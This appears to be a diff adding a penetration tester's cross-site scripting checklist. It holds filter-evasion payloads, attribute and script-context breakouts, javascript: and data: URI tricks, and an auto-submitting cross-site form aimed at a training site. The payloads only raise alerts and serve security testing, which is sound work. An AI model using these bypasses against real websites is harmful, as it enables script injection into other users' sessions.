@@ -1,0 +1,71 @@
+* Do not forget to inject into pramaters names too.
+
+* Try repeating the same parameter and dividing payload into chunks : ?message=<scr%00ipt%20&message=> alert('1')</script>
+
+* Try to change the charset attribute in the content-type header and inject payloads with the encoding specified.
+
+* Try to add # at each URL and include javascript payload after it
+
+* Try these payloads:
+	"><script >alert(1)</script >
+	"><ScRiPt>alert(1)</ScRiPt>
+	"%3e%3cscript%3ealert(1)%3c/script%3e
+	"><scr<script>ipt>alert(1)</scr</script>ipt>
+	%00"><script>alert(1)</script>
+	<img/%00/onerror=alert(1) src=a>
+	<script/anyjunk>alert(1)</script>
+	<img/onerror="alert(1)"src=a>
+	<img onerror=a&#x6c;ert(1) src=a>
+	<iframe src=j&#x61;vasc&#x72ipt&#x3a;alert&#x28;1&#x29; >
+	<img onerror=a&#108ert(1) src=a>
+	<img onerror=a&#000108ert(1) src=a>
+	%253cimg%20onerror=alert(1)%20src=a%253e
+	«img onerror=alert(1) src=a»
+  // this may work in case of using unicode
+	<<script>alert(1);//<</script>
+	<script>'alert(1)'.replace(/.+/,eval)</script>
+	<i onclick=alert(1)>Click here</i>
+	<b style=behavior:url(#default#time2) onclick=alert(1)>aa
+
+* For input that is copied into a tag like <input type="text" name="loginid" value="abcd">, to avoid using "><script>alert(2)</script>, use this " onfocus="alert(1) which gives <input type="text" ... value="" onfocus="alert(1)">
+
+* When the input is injected into <script></script>, try ';alert(2);//   ==> // comments the rest
+
+* When the input is injected into the href attribute of an <a> tag, try these payloads:
+	- javascript:alert(1); which will give <a href="javascript:alert(1)">word</a>
+	- data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg== which will give <a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">link</a>
+	- j&#x61;vasc&#x72ipt&#x3a;alert&#x28;1&#x29;  which is the HTML-encoded form of javascript:alert(1)
+
+* When injecting into other tags, search for event handlers within that tag like onmouseover and onclick,...
+
+* Try injecting new tags like <x src=a onclick=alert(1)>aaa</x>
+
+* If the input is injected into a variable like var a = 'foo' //foo is the entered value; try this foo\'; alert(1);//
+which will give var a = 'foo\\';alert(1);//' when the application adds / to sanitize an ' character
+
+* When multiple values are vulnerable but limited in length, try : 
+		?value1="><script>/*&value2=*/alert(1)/*&value3=*/</script>
+
+* If message is vulnerable to XSS but limited in length, try : 
+	http://mdsec.net/error/5/Error.ashx?message=<script>eval(unescape(location))</script>#%0Aalert('script here')
+
+* Try injecting into parameters after converting the request from GET to POST and vice versa.
+
+* Test XSS on the Referer header.
+
+* When the XSS is whithin the POST method, and the data to send to the server is XML, try to create a form in the server we control, specify the enctype as form and manipulate the name and value of the input in order to have a convenient value when the application adds = . Example, if the message body to send to the server is
+	<?xml version="1.0"?><data><param>foo</param></data> try to create a form like this:
+
+	<form enctype="text/plain" action="http://wahh-app.com/vuln.php" method="POST">
+	<input type=”hidden” name='<?xml version' value='"1.0"?><data><param>foo</param></data>'>
+	</form><script>document.forms[0].submit();</script>
+	
+* When working with XML, try to inject this:
+	<xml><data><a xmlns:a='http://www.w3.org/1999/xhtml'><a:body onload='alert(1)'/></a></data></xml>
+
+* When the application uses ajax that retrives resources from the source that is after the fragment # (example http://bla/page#profile), try to include external html resource (#http://....html) or internal relative one retrieved from the mapping process.
+
+* When testing for DOM based XSS, because the app retrives data from URL, add a parameter with XSS payload. Example: if the original request is http://bla/page?log=true, change it to http://bla/page?log=true&foo=<script>alert(3)</script>
+or change the prefix of the original parameter name: http://bla/page?foolog=<script>alert(2)</script>&log=true
+
+* !!P.S: When inserting user controllable data into a html tag, remember that the application first html decodes it. So try to HTML-encode the payload before injecting it.example: <img src="javascript&#58;alert(1)"> 
